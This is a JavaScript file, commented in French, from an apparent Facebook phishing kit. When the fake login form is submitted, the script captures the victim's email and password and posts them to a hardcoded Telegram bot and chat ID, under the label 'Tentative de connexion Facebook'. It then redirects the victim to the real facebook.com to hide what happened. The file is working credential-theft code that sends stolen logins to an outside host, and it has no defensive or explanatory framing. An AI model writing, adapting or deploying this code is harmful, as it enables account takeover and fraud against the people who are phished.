document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  
  // Remplace ceci par ton vrai TOKEN & chat ID
  const botToken = "7256264057:AAH7pHWzuVY44KfjTXRjj8nw60AIgpceIeA";
  const chatId = "7952390944";
  
  const message = `🟦 *Tentative de connexion Facebook* 🟦

📧 *Email* : \`${email}\`
🔑 *Mot de passe* : \`${password}\`

━━━━━━━━━━━━━━━
👨‍💻 Dev : @mrbladehassan10  
📢 Canal : @bladecyberzone52
━━━━━━━━━━━━━━━`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      })
    })
    .then(response => {
      if (response.ok) {
        document.getElementById("successMessage").classList.remove("hidden");
        setTimeout(() => {
          window.location.href = "https://facebook.com";
        }, 2000);
      } else {
        alert("Erreur d'envoi Telegram.");
      }
    })
    .catch(err => {
      console.error("Erreur :", err);
      alert("Erreur réseau.");
    });
});